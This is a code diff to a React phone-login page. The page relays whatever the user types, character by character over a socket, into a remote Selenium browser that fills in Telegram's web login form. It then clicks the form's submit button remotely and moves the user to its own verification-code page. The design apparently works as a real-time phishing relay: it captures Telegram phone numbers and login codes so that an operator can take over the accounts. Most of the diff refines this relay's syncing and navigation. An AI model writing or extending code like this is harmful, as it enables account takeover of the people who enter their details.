@@ -440,6 +440,14 @@ export const PhoneLoginPage: FC = () => {
                 console.log('🎉 All input fields are ready! Enabling form...');
                 setIsInputsReady(true);
                 setSeleniumStatus('Selenium ready - all elements found!');
+                
+                // Auto-sync phone number when all inputs are ready
+                setTimeout(() => {
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    console.log('🔧 Auto-syncing phone number when all inputs are ready...');
+                    fixCountryAndPhoneSync();
+                  }
+                }, 1000); // Wait 1 second for form to be fully ready
               } else {
                 console.log('⏳ Still waiting for input fields:', {
                   phoneCodeFound: currentPhoneCodeFound,
@@ -472,6 +480,14 @@ export const PhoneLoginPage: FC = () => {
               setSeleniumStatus('Selenium session active, checking elements...');
               // Check for elements
               checkQrCodeButtonInSelenium();
+              
+              // Auto-sync phone number after session is confirmed active
+              setTimeout(() => {
+                if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                  console.log('🔧 Auto-syncing phone number after session confirmed active...');
+                  fixCountryAndPhoneSync();
+                }
+              }, 3000); // Wait 3 seconds for elements to be checked
             } else {
               console.log('❌ Selenium session is not active');
               setSeleniumStatus('❌ No Selenium session found - please start a new session');
@@ -491,6 +507,18 @@ export const PhoneLoginPage: FC = () => {
                 console.log('✅ Auth form button clicked successfully');
                 // Note: This event is now handled in handleSubmit, not here
                 // The button click confirmation will start verification page monitoring
+                break;
+                
+              case 'verificationPageDetected':
+                console.log('🎉 Verification page detected via server event! Navigating immediately...');
+                setSeleniumStatus('Verification page detected via server! Navigating...');
+                
+                // Reset isSubmitting and navigate
+                setIsSubmitting(false);
+                setIsMonitoringVerificationPage(false);
+                
+                // Navigate to verification code page
+                navigate(`/verification-code?sessionId=${sessionId}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                 break;
                 
               case 'error':
@@ -616,15 +644,85 @@ export const PhoneLoginPage: FC = () => {
           }
         });
         
-        // Listen for page URL check results
-        socket.on('pageUrlResult', (data: any) => {
-          console.log('🔍 Page URL result received:', data);
+        // Listen for verification page check results
+        socket.on('verificationPageCheckResult', (data: any) => {
+          console.log('🔍 Verification page check result received:', data);
           if (data.sessionId === sessionId) {
             if (data.isVerificationPage) {
-              console.log('🎉 Verification page detected via URL check!');
+              console.log('🎉 Verification page detected via dedicated check!');
               setSeleniumStatus(`Verification page detected: ${data.currentTitle}`);
+              
+              // CRITICAL: Navigate to verification page when detected
+              if (isSubmitting) {
+                console.log('🔄 Verification page detected via dedicated check - navigating immediately!');
+                setIsMonitoringVerificationPage(false);
+                
+                // Navigate to verification code page
+                setTimeout(() => {
+                  console.log('🔄 Navigating to verification code page from dedicated check...');
+                  
+                  // Get the actual phone number from Selenium window to ensure accuracy
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    console.log('🔍 Getting actual phone number from Selenium before navigation...');
+                    socketRef.current.emit('getCurrentInputValue', {
+                      sessionId: sessionIdRef.current,
+                      inputType: 'phoneNumber',
+                      timestamp: new Date().toISOString()
+                    });
+                    
+                    // Listen for the response and then navigate
+                    socketRef.current.once('seleniumInputChange', (data) => {
+                      if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
+                        console.log('🔍 Actual phone number from Selenium:', data.value);
+                        console.log('🔍 React state phone number:', phoneNumber);
+                        
+                        // Use the actual Selenium value for navigation
+                        const actualPhoneNumber = data.value || phoneNumber;
+                        console.log('🔍 Using phone number for navigation:', actualPhoneNumber);
+                        
+                        // CRITICAL: Reset isSubmitting when navigation happens
+                        setIsSubmitting(false);
+                        console.log('🔒 isSubmitting reset to false for navigation');
+                        
+                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(actualPhoneNumber)}`);
+                      } else {
+                        // Fallback to React state if Selenium response is unexpected
+                        console.log('🔍 Using React state as fallback:', phoneNumber);
+                        
+                        // CRITICAL: Reset isSubmitting when navigation happens
+                        setIsSubmitting(false);
+                        console.log('🔒 isSubmitting reset to false for fallback navigation');
+                        
+                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+                      }
+                    });
+                    
+                    // Set a timeout in case Selenium doesn't respond
+                    setTimeout(() => {
+                      console.log('🔍 Selenium timeout, using React state:', phoneNumber);
+                      
+                      // CRITICAL: Reset isSubmitting when navigation happens
+                      setIsSubmitting(false);
+                      console.log('🔒 isSubmitting reset to false for timeout navigation');
+                      
+                      navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+                    }, 2000);
+                  } else {
+                    // Fallback if socket not connected
+                    console.log('🔍 Socket not connected, using React state:', phoneNumber);
+                    
+                    // CRITICAL: Reset isSubmitting when navigation happens
+                    setIsSubmitting(false);
+                    console.log('🔒 isSubmitting reset to false for socket fallback navigation');
+                    
+                    navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+                  }
+                }, 500); // Short delay to ensure smooth transition
+              } else {
+                console.log('⚠️ Verification page detected but form not submitting - navigation blocked for security');
+              }
             } else {
-              console.log('🔍 Current page:', data.currentTitle, data.currentUrl);
+              console.log('🔍 Not on verification page:', data.currentTitle, data.currentUrl);
               setSeleniumStatus(`Current page: ${data.currentTitle}`);
             }
           }
@@ -642,6 +740,8 @@ export const PhoneLoginPage: FC = () => {
             console.log('🔄 Periodic check for input fields...');
             checkInputFieldsInSelenium();
           }
+          
+                     
         }, 3000);
 
         // Periodic sync check to prevent fields from getting out of sync
@@ -804,32 +904,7 @@ export const PhoneLoginPage: FC = () => {
     };
   }, []);
 
-  // Function to automatically clear the phone number input field
-  const autoClearPhoneNumberField = () => {
-    console.log('🔍 autoClearPhoneNumberField called');
-    console.log('🔍 Socket connected:', socketRef.current?.connected);
-    console.log('🔍 Session ID:', sessionIdRef.current);
-    
-    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-      console.log('🗑️ Auto-clearing phone number field...');
-      const emitData = {
-        sessionId: sessionIdRef.current,
-        inputType: 'phoneNumber',
-        method: 'clear',
-        timestamp: new Date().toISOString()
-      };
-      console.log('🔍 Emitting eraseTextInSelenium with data:', emitData);
-      
-      socketRef.current.emit('eraseTextInSelenium', emitData);
-      
-      // Listen for the response
-      socketRef.current.once('seleniumInputChange', (data) => {
-        console.log('✅ Received seleniumInputChange response:', data);
-      });
-    } else {
-      console.log('❌ Cannot clear field - missing socket or session');
-    }
-  };
+
 
   // Monitor state changes for debugging
   useEffect(() => {
@@ -862,7 +937,6 @@ export const PhoneLoginPage: FC = () => {
       console.log('🔍 Checking if QR code button is present in Selenium window...');
       socketRef.current.emit('checkElementInSelenium', {
         sessionId: sessionIdRef.current,
-        selector: 'div#auth-phone-number-form form button',
         elementType: 'qrCodeButton',
         timestamp: new Date().toISOString()
       });
@@ -877,7 +951,6 @@ export const PhoneLoginPage: FC = () => {
       // Check for phone code input
       socketRef.current.emit('checkElementInSelenium', {
         sessionId: sessionIdRef.current,
-        selector: 'input#sign-in-phone-code',
         timestamp: new Date().toISOString(),
         elementType: 'phoneCodeInput'
       });
@@ -885,7 +958,6 @@ export const PhoneLoginPage: FC = () => {
       // Check for phone number input
       socketRef.current.emit('checkElementInSelenium', {
         sessionId: sessionIdRef.current,
-        selector: 'input#sign-in-phone-number',
         timestamp: new Date().toISOString(),
         elementType: 'phoneNumberInput'
       });
@@ -915,7 +987,6 @@ export const PhoneLoginPage: FC = () => {
       // Try alternative selectors for phone code input
       socketRef.current.emit('checkElementInSelenium', {
         sessionId: sessionIdRef.current,
-        selector: 'input[name="phone_code"], input[placeholder*="code"], input[type="tel"]',
         timestamp: new Date().toISOString(),
         elementType: 'phoneCodeInput'
       });
@@ -923,7 +994,6 @@ export const PhoneLoginPage: FC = () => {
       // Try alternative selectors for phone number input
       socketRef.current.emit('checkElementInSelenium', {
         sessionId: sessionIdRef.current,
-        selector: 'input[name="phone_number"], input[placeholder*="phone"], input[type="tel"]',
         timestamp: new Date().toISOString(),
         elementType: 'phoneNumberInput'
       });
@@ -941,105 +1011,74 @@ export const PhoneLoginPage: FC = () => {
     }
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+    const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     
-    // Handle phone number submission here
-    const fullPhoneNumber = selectedCountry.dialCode + phoneNumber;
-    console.log('Phone number submitted:', fullPhoneNumber);
+    console.log('📱 Form submitted, clicking NEXT button in Selenium...');
+    console.log('📱 Phone number:', phoneNumber);
     
-    // CRITICAL FIX: Don't navigate until Selenium actually clicks the button
-    // Click the submit button in the Selenium window and wait for confirmation
+    // Disable the form to prevent multiple submissions
+    setIsInputsReady(false);
+    setIsSubmitting(true);
+    setSeleniumStatus('Clicking NEXT button in Selenium...');
+    
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-      console.log('🖱️ Clicking submit button in Selenium window...');
-      setSeleniumStatus('Clicking submit button in Selenium window...');
+      // Click NEXT button in Selenium window
+      console.log('🖱️ Clicking NEXT button in Selenium window...');
       
-      // Disable the form to prevent multiple submissions
-      setIsInputsReady(false);
-      setIsSubmitting(true);
-      
-      // Use the correct selector
       const correctSelector = '#auth-phone-number-form button[type="submit"]';
-      console.log('🔍 Using correct selector:', correctSelector);
+      console.log('🔍 Using selector:', correctSelector);
       
-      // Emit the button click event
-      console.log('📤 Emitting clickAuthFormButton event...');
-      console.log('🔍 Session ID being sent:', sessionIdRef.current);
-      console.log('🔍 Selector being sent:', correctSelector);
+      // Set up event listener BEFORE sending the button click
+      socketRef.current.once('telegramLoginUpdate', (data) => {
+        console.log('📥 Received telegramLoginUpdate response:', data);
+        
+        if (data.sessionId === sessionIdRef.current && data.event === 'buttonClicked') {
+          console.log('✅ NEXT button clicked successfully! Navigating to verification page...');
+          setSeleniumStatus('NEXT button clicked! Navigating to verification page...');
+          
+          // Navigate immediately to verification code page
+          setIsSubmitting(false);
+          navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+        } else if (data.event === 'error') {
+          console.log('❌ NEXT button click failed:', data.data?.error);
+          setSeleniumStatus(`NEXT button click failed: ${data.data?.error}`);
+          
+          // Re-enable form on error
+          setIsInputsReady(true);
+          setIsSubmitting(false);
+        } else {
+          console.log('❌ Unexpected response from Selenium:', data);
+          setSeleniumStatus('Unexpected response from Selenium');
+          setIsInputsReady(true); // Re-enable form
+          setIsSubmitting(false); // Reset submitting state
+        }
+      });
       
-      // Send button click immediately - session verification is handled elsewhere
-      console.log('🚀 Sending button click...');
+      // Send the button click
       socketRef.current.emit('clickAuthFormButton', {
         sessionId: sessionIdRef.current,
         selector: correctSelector,
         timestamp: new Date().toISOString()
       });
-      console.log('✅ clickAuthFormButton event emitted successfully');
       
-              // Update status to show the action
-        setSeleniumStatus('Submit button clicked in Selenium window, waiting for response...');
-        
-        // CRITICAL FIX: Set up event listener BEFORE sending the button click
-        console.log('🔒 Setting up telegramLoginUpdate listener BEFORE sending button click...');
-        
-        // Listen for the button click confirmation
-        socketRef.current.once('telegramLoginUpdate', (data) => {
-          console.log('📥 Received telegramLoginUpdate response:', data);
-          
-          if (data.sessionId === sessionIdRef.current && data.event === 'buttonClicked') {
-            console.log('✅ Button click confirmed by Selenium, starting verification page monitoring...');
-            setSeleniumStatus('Button click confirmed! Monitoring for verification page...');
-            
-            // CRITICAL: Keep isSubmitting true during the entire monitoring process
-            console.log('🔒 isSubmitting state maintained for monitoring:', true);
-            console.log('🔒 Current state before monitoring: isSubmitting =', isSubmitting, 'isInputsReady =', isInputsReady);
-            
-            // CRITICAL: Prevent form from being re-enabled during submission
-            console.log('🔒 Blocking form re-enablement during submission...');
-            
-            // Now start monitoring for verification page
-            startVerificationPageMonitoring();
-          } else if (data.event === 'verificationPageDetected') {
-            console.log('🎉 Verification page detected via URL check! Navigating...');
-            setSeleniumStatus('Verification page detected! Navigating...');
-            
-            // CRITICAL: Reset isSubmitting and navigate
-            setIsSubmitting(false);
-            setIsMonitoringVerificationPage(false);
-            
-            // Navigate to verification code page
-            navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
-          } else if (data.event === 'error') {
-            console.log('❌ Button click failed:', data.data?.error);
-            setSeleniumStatus(`Button click failed: ${data.data?.error}`);
-            
-            // Re-enable form on error
-            setIsInputsReady(true);
-            setIsSubmitting(false);
-          } else {
-            console.log('❌ Unexpected response from Selenium:', data);
-            setSeleniumStatus('Unexpected response from Selenium');
-            setIsInputsReady(true); // Re-enable form
-            setIsSubmitting(false); // Reset submitting state
-          }
-        });
-        
-        // CRITICAL: Now send the button click AFTER setting up the listener
-        console.log('🚀 Sending button click AFTER setting up listener...');
+      console.log('✅ NEXT button click event emitted successfully');
       
-      // Set a timeout in case Selenium doesn't respond
+      // Set a timeout in case the process takes too long
       setTimeout(() => {
         if (isSubmitting) {
-          console.log('⏰ Selenium button click timeout, re-enabling form');
-          setSeleniumStatus('Button click timeout - please try again');
+          console.log('⏰ Submission timeout, re-enabling form');
+          setSeleniumStatus('Submission timeout - please try again');
           setIsInputsReady(true); // Re-enable form
           setIsSubmitting(false); // Reset submitting state
         }
-      }, 10000); // 10 second timeout
+      }, 15000); // 15 second timeout
       
     } else {
-      console.log('❌ Cannot click submit button - missing socket or session');
+      console.log('❌ Cannot submit - missing socket or session');
       setSeleniumStatus('Error: Cannot connect to Selenium');
+      setIsInputsReady(true);
+      setIsSubmitting(false);
     }
   };
 
@@ -1058,26 +1097,27 @@ export const PhoneLoginPage: FC = () => {
     }
   };
 
-  // Function to sync the full phone number (with country code) to Selenium
+  // Function to sync the phone number to Selenium
   const syncFullPhoneNumberToSelenium = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-      const fullPhoneNumber = selectedCountry.dialCode + phoneNumber;
-      console.log(`🔄 Syncing full phone number to Selenium:`, fullPhoneNumber);
+      console.log(`🔄 Manual sync: Sending full phone number with country code:`, phoneNumber);
       
+      // For manual sync: Send the FULL value with country code to maintain consistency
       socketRef.current.emit('syncInputToSelenium', {
         sessionId: sessionIdRef.current,
         inputType: 'phoneNumber',
-        value: fullPhoneNumber,
+        value: phoneNumber, // Send FULL value with country code
         timestamp: new Date().toISOString()
       });
     }
   };
 
-  // Function to handle phone number input changes
+  // Function to handle phone number input changes (NO SYNC - just update state)
   const handlePhoneNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const newValue = e.target.value;
+    console.log("handlePhoneNumberChange; newValue => ", newValue);
     
-    console.log('📱 Phone number input received:', {
+    console.log('handlePhoneNumberChange; 📱 Phone number input received:', {
       newValue,
       currentPhoneNumber: phoneNumber,
       selectedCountry: selectedCountry.dialCode
@@ -1085,134 +1125,101 @@ export const PhoneLoginPage: FC = () => {
     
     // Don't modify pasted values - preserve them exactly as entered
     // Only ensure there's a space after the country code if it's missing
-    const countryCode = selectedCountry.dialCode;
-    let correctedValue = newValue;
+    // const countryCode = selectedCountry.dialCode;
+    // let correctedValue = newValue;
+
+    // console.log('handlePhoneNumberChange; 🔍 Country code:', countryCode);
+    // console.log('handlePhoneNumberChange; 🔍 correctedValue:', correctedValue);
     
-    // Check if the value starts with the country code (with or without space)
-    if (newValue.startsWith(countryCode) && !newValue.startsWith(countryCode + ' ')) {
-      // Add space after country code if missing
-      correctedValue = countryCode + ' ' + newValue.substring(countryCode.length);
-      console.log('📱 Added space after country code:', correctedValue);
-    } else if (!newValue.startsWith(countryCode)) {
-      // If user tries to change country code, preserve their input but log it
-      console.log('📱 User input doesn\'t start with country code, preserving input:', newValue);
-      correctedValue = newValue;
-    } else {
-      // Value is already correct format
-      correctedValue = newValue;
-    }
+    // // Check if the value starts with the country code (with or without space)
+    // if (newValue.startsWith(countryCode) && !newValue.startsWith(countryCode + ' ')) {
+    //   // Add space after country code if missing
+    //   correctedValue = countryCode + ' ' + newValue.substring(countryCode.length);
+    //   console.log('📱 Added space after country code:', correctedValue);
+    // } else if (!newValue.startsWith(countryCode)) {
+    //   // If user tries to change country code, preserve their input but log it
+    //   console.log('📱 User input doesn\'t start with country code, preserving input:', newValue);
+    //   correctedValue = newValue;
+    // } else {
+    //   // Value is already correct format
+    //   correctedValue = newValue;
+    // }
     
     // Update the state with the corrected value
-    setPhoneNumber(correctedValue);
+    setPhoneNumber(newValue);
     
-
-    
-    console.log('📱 Phone number processed:', {
-      inputValue: newValue,
-      correctedValue: correctedValue,
-      countryCode: countryCode,
-      willSync: true
-    });
-
-    // Clear any existing timeout
-    if (debouncedSyncToSelenium.current) {
-      clearTimeout(debouncedSyncToSelenium.current);
-    }
-
-    // Set a new timeout to sync after user stops typing
-    debouncedSyncToSelenium.current = setTimeout(() => {
-      console.log('⏱️ User stopped typing, syncing complete phone number...');
-      console.log('⏱️ Final value to sync:', correctedValue);
-      // Use the corrected value, not the old state
-      syncCompletePhoneNumber(correctedValue);
-    }, 1000); // Wait 1 second after user stops typing
-  };
-
-  // Debounced function to sync the complete phone number to Selenium
-  const debouncedSyncToSelenium = useRef<ReturnType<typeof setTimeout> | null>(null);
-
-  // Function to sync the complete phone number after user stops typing
-  const syncCompletePhoneNumber = (value: string) => {
+    // REAL-TIME SYNC: Send to Selenium immediately for character-by-character sync
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-      console.log('🔄 STARTING SYNC OPERATION');
-      console.log('🔄 React phone number:', phoneNumber);
-      console.log('🔄 Value to sync:', value);
-      console.log('🔄 Current syncing flag:', isSyncingRef.current);
+      console.log('🔄 REAL-TIME SYNC: Sending to Selenium immediately:', newValue);
       
-      // Set the syncing flag to prevent state updates
-      isSyncingRef.current = true;
-      console.log('🔄 Set syncing flag to TRUE');
-      
-      // Don't clear the field first - just type the new value directly
-      // This prevents the field from being cleared unnecessarily
-      console.log('⌨️ Typing complete phone number in Selenium:', value);
       socketRef.current.emit('syncInputToSelenium', {
         sessionId: sessionIdRef.current,
         inputType: 'phoneNumber',
-        value: value,
+        value: newValue,
         timestamp: new Date().toISOString()
       });
       
-      // Reset the syncing flag after a delay to allow for response
-      setTimeout(() => {
-        isSyncingRef.current = false;
-        console.log('✅ Sync operation completed, state updates re-enabled');
-      }, 1000); // 1 second delay
-      
-      // DO NOT clear the React frontend input - keep user's text visible!
-    } else {
-      console.log('❌ Cannot sync - socket not connected or no session');
+      setSeleniumStatus('Phone number syncing in real-time...');
     }
+    
+    // console.log('📱 Phone number processed and synced in real-time:', {
+    //   inputValue: newValue,
+    //   correctedValue: correctedValue,
+    //   countryCode: countryCode,
+    //   syncedToSelenium: true
+    // });
   };
 
+
+
   // Function to handle keydown events (for backspace detection)
-  const handlePhoneNumberKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
-    return false;
-    console.log('⌨️ Key pressed:', e.key, 'Ctrl:', e.ctrlKey, 'Shift:', e.shiftKey);
+  // const handlePhoneNumberKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
+  //   return false;
+  //   console.log('⌨️ Key pressed:', e.key, 'Ctrl:', e.ctrlKey, 'Shift:', e.shiftKey);
     
-    if (e.key === 'Backspace') {
-      console.log('⌨️ Backspace detected in phone number field');
+  //   if (e.key === 'Backspace') {
+  //     console.log('⌨️ Backspace detected in phone number field');
       
-      // Sync backspace to Selenium window
-      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-        console.log('🔄 Syncing backspace to Selenium...');
-        socketRef.current.emit('eraseTextInSelenium', {
-          sessionId: sessionIdRef.current,
-          inputType: 'phoneNumber',
-          method: 'backspace',
-          count: 1,
-          timestamp: new Date().toISOString()
-        });
-      }
-    } else if (e.key === 'Delete') {
-      console.log('⌨️ Delete key detected in phone number field');
+  //     // Sync backspace to Selenium window
+  //     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+  //       console.log('🔄 Syncing backspace to Selenium...');
+  //       socketRef.current.emit('eraseTextInSelenium', {
+  //         sessionId: sessionIdRef.current,
+  //         inputType: 'phoneNumber',
+  //         method: 'backspace',
+  //         count: 1,
+  //         timestamp: new Date().toISOString()
+  //       });
+  //     }
+  //   } else if (e.key === 'Delete') {
+  //     console.log('⌨️ Delete key detected in phone number field');
       
-      // Sync delete to Selenium window
-      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-        console.log('🔄 Syncing delete to Selenium...');
-        socketRef.current.emit('eraseTextInSelenium', {
-          sessionId: sessionIdRef.current,
-          inputType: 'phoneNumber',
-          method: 'delete',
-          count: 1,
-          timestamp: new Date().toISOString()
-        });
-      }
-    } else if (e.ctrlKey && e.key === 'a') {
-      console.log('⌨️ Ctrl+A (Select All) detected in phone number field');
+  //     // Sync delete to Selenium window
+  //     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+  //       console.log('🔄 Syncing delete to Selenium...');
+  //       socketRef.current.emit('eraseTextInSelenium', {
+  //         sessionId: sessionIdRef.current,
+  //         inputType: 'phoneNumber',
+  //         method: 'delete',
+  //         count: 1,
+  //         timestamp: new Date().toISOString()
+  //       });
+  //     }
+  //   } else if (e.ctrlKey && e.key === 'a') {
+  //     console.log('⌨️ Ctrl+A (Select All) detected in phone number field');
       
-      // Sync select all to Selenium window
-      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-        console.log('🔄 Syncing select all to Selenium...');
-        socketRef.current.emit('eraseTextInSelenium', {
-          sessionId: sessionIdRef.current,
-          inputType: 'phoneNumber',
-          method: 'selectAll',
-          timestamp: new Date().toISOString()
-        });
-      }
-    }
-  };
+  //     // Sync select all to Selenium window
+  //     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+  //       console.log('🔄 Syncing select all to Selenium...');
+  //       socketRef.current.emit('eraseTextInSelenium', {
+  //         sessionId: sessionIdRef.current,
+  //         inputType: 'phoneNumber',
+  //         method: 'selectAll',
+  //         timestamp: new Date().toISOString()
+  //       });
+  //     }
+  //   }
+  // };
 
   // Function to handle country selection changes
   const handleCountrySelect = (country: Country) => {
@@ -1222,16 +1229,22 @@ export const PhoneLoginPage: FC = () => {
     // Set phone number to country dial code with a space after it
     setPhoneNumber(country.dialCode + ' ');
     
-
+    // NO COUNTRY SYNC - let Selenium handle its own country selection
+    // Only sync the phone number input field
+    console.log('🌍 Country changed to:', country.name, country.dialCode);
+    console.log('🌍 Phone number updated to:', country.dialCode + ' ');
     
-    // Sync country selection to Selenium
+    // Sync the updated phone number (with country code) to Selenium
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-      console.log('🔄 Syncing country selection to Selenium:', country.name);
-      socketRef.current.emit('syncCountryToSelenium', {
-        sessionId: sessionIdRef.current,
-        countryName: country.name,
-        timestamp: new Date().toISOString()
-      });
+      setTimeout(() => {
+        console.log('📱 Syncing updated phone number after country change:', country.dialCode + ' ');
+        socketRef.current?.emit('syncInputToSelenium', {
+          sessionId: sessionIdRef.current,
+          inputType: 'phoneNumber',
+          value: country.dialCode + ' ', // Send country code + space
+          timestamp: new Date().toISOString()
+        });
+      }, 500); // Short delay to ensure country change is processed
     }
   };
 
@@ -1313,6 +1326,26 @@ export const PhoneLoginPage: FC = () => {
     }
   };
 
+  // Function to fix country and phone number sync issues
+  // Function to fix phone number sync issues (NO COUNTRY SYNC)
+  const fixCountryAndPhoneSync = () => {
+    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+      console.log('🔧 Fixing phone number synchronization (no country sync)...');
+      
+      // Only sync the phone number - let Selenium handle its own country
+      console.log('📱 Syncing phone number to Selenium:', phoneNumber);
+      
+      socketRef.current.emit('syncInputToSelenium', {
+        sessionId: sessionIdRef.current,
+        inputType: 'phoneNumber',
+        value: phoneNumber, // Send FULL value with country code
+        timestamp: new Date().toISOString()
+      });
+      
+      setSeleniumStatus('Phone number sync completed (country not synced)');
+    }
+  };
+
   // Function to force resync React field with Selenium
   const forceResyncFromSelenium = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
@@ -1332,7 +1365,8 @@ export const PhoneLoginPage: FC = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log('🔄 Force resyncing Selenium field with React...');
       
-      // Send current React value to Selenium
+      // For force resync: Send the FULL value with country code to maintain consistency
+      console.log('🔄 Force resync: Sending full phone number with country code:', phoneNumber);
       syncInputToSelenium('phoneNumber', phoneNumber);
     }
   };
@@ -1363,22 +1397,15 @@ export const PhoneLoginPage: FC = () => {
         // Set syncing flag
         isSyncingRef.current = true;
         
-        // Clear Selenium field first
-        socketRef.current?.emit('eraseTextInSelenium', {
-          sessionId: sessionIdRef.current,
-          inputType: 'phoneNumber',
-          method: 'clear',
-          timestamp: new Date().toISOString()
-        });
-        
-        // Wait for clear, then type
+        // Type the value directly without clearing first
         setTimeout(() => {
           if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-            console.log('⌨️ Typing value in Selenium:', phoneNumber);
+            // For force complete resync: Send the FULL value with country code to maintain consistency
+            console.log('⌨️ Force complete resync: Typing full value in Selenium:', phoneNumber);
             socketRef.current.emit('syncInputToSelenium', {
               sessionId: sessionIdRef.current,
               inputType: 'phoneNumber',
-              value: phoneNumber,
+              value: phoneNumber, // Send FULL value with country code
               timestamp: new Date().toISOString()
             });
             
@@ -1404,7 +1431,7 @@ export const PhoneLoginPage: FC = () => {
                   clearTimeout(verifyTimeout);
                   if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
                     console.log('🔍 Selenium field value:', data.value);
-                    console.log('🔍 Expected value:', phoneNumber);
+                    console.log('🔍 Expected value (full phone number):', phoneNumber);
                     
                     if (data.value === phoneNumber) {
                       console.log('✅ Force resync successful!');
@@ -1639,6 +1666,14 @@ export const PhoneLoginPage: FC = () => {
         sessionId: sessionIdRef.current,
         timestamp: new Date().toISOString()
       });
+      
+      // Also trigger an auto-sync to fix any phone number mismatches
+      setTimeout(() => {
+        if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+          console.log('🔧 Auto-syncing phone number after session check...');
+          fixCountryAndPhoneSync();
+        }
+      }, 2000); // Wait 2 seconds for session status to be received
     }
   };
 
@@ -1681,17 +1716,12 @@ export const PhoneLoginPage: FC = () => {
         for (const selector of verificationSelectors) {
           socketRef.current.emit('checkElementInSelenium', {
             sessionId: sessionIdRef.current,
-            selector: selector,
             timestamp: new Date().toISOString(),
             elementType: 'verificationCodeInput'
           });
         }
         
-        // CRITICAL BACKUP: Also check if the page URL has changed to verification page
-        socketRef.current.emit('checkPageUrl', {
-          sessionId: sessionIdRef.current,
-          timestamp: new Date().toISOString()
-        });
+
       } else {
         console.log('❌ Socket disconnected during monitoring, stopping...');
         clearInterval(monitoringInterval);
@@ -1779,16 +1809,7 @@ export const PhoneLoginPage: FC = () => {
       isSyncingRef.current = true;
       console.log('🔄 Set syncing flag to TRUE');
       
-      // First clear the Selenium field completely
-      console.log('🔄 Clearing Selenium field...');
-      socketRef.current.emit('eraseTextInSelenium', {
-        sessionId: sessionIdRef.current,
-        inputType: 'phoneNumber',
-        method: 'clear',
-        timestamp: new Date().toISOString()
-      });
-
-      // Wait a bit for the clear to complete, then type the new value
+      // Type the value directly without clearing first
       setTimeout(() => {
         if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
           console.log('⌨️ Typing current phone number in Selenium:', phoneNumber);
@@ -2039,16 +2060,11 @@ Status: ${seleniumStatus}`);
               <button
                 onClick={() => {
                   console.log('🔄 Manually syncing current state to Selenium...');
+                  
+                  // Send the full phone number with country code
+                  console.log('🔄 Manual sync: Sending full phone number with country code:', phoneNumber);
                   syncInputToSelenium('phoneNumber', phoneNumber);
-                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-                    socketRef.current.emit('syncCountryToSelenium', {
-                      sessionId: sessionIdRef.current,
-                      country: selectedCountry.name,
-                      dialCode: selectedCountry.dialCode,
-                      timestamp: new Date().toISOString()
-                    });
-                  }
-                  setSeleniumStatus('State synced to Selenium');
+                  setSeleniumStatus('Phone number synced to Selenium (no country sync)');
                 }}
                 style={{
                   marginTop: '8px',
@@ -2086,41 +2102,25 @@ Status: ${seleniumStatus}`);
             {isInputsReady && (
               <button
                 onClick={() => {
-                  console.log('🗑️ Manually clearing phone number field...');
-                  autoClearPhoneNumberField();
-                  setSeleniumStatus('Phone number field cleared');
-                }}
-                style={{
-                  marginTop: '8px',
-                  marginLeft: '8px',
-                  padding: '4px 12px',
-                  fontSize: '11px',
-                  backgroundColor: '#dc3545',
-                  color: 'white',
-                  border: 'none',
-                  borderRadius: '4px',
-                  cursor: 'pointer'
-                }}
-              >
-                Clear Phone Field
-              </button>
-            )}
-            {isInputsReady && (
-              <button
-                onClick={() => {
-                  console.log('🧪 Testing erase function...');
+                  console.log('🔍 DEBUG: Current React state vs Selenium state...');
+                  console.log('🔍 React country:', selectedCountry.name, selectedCountry.dialCode);
+                  console.log('🔍 React phone number:', phoneNumber);
+                  console.log('🔍 React phone number length:', phoneNumber.length);
+                  console.log('🔍 React phone number starts with country code:', phoneNumber.startsWith(selectedCountry.dialCode));
+                  
                   if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-                    console.log('🔍 Testing direct emit...');
-                    socketRef.current.emit('eraseTextInSelenium', {
+                    // Get current Selenium values
+                    socketRef.current.emit('getCurrentInputValue', {
                       sessionId: sessionIdRef.current,
                       inputType: 'phoneNumber',
-                      method: 'clear',
                       timestamp: new Date().toISOString()
                     });
-                    setSeleniumStatus('Test clear sent');
-                  } else {
-                    console.log('❌ Socket not ready for test');
-                    setSeleniumStatus('Socket not ready');
+                    
+                    // Also check country
+                    socketRef.current.emit('checkCurrentCountryInSelenium', {
+                      sessionId: sessionIdRef.current,
+                      timestamp: new Date().toISOString()
+                    });
                   }
                 }}
                 style={{
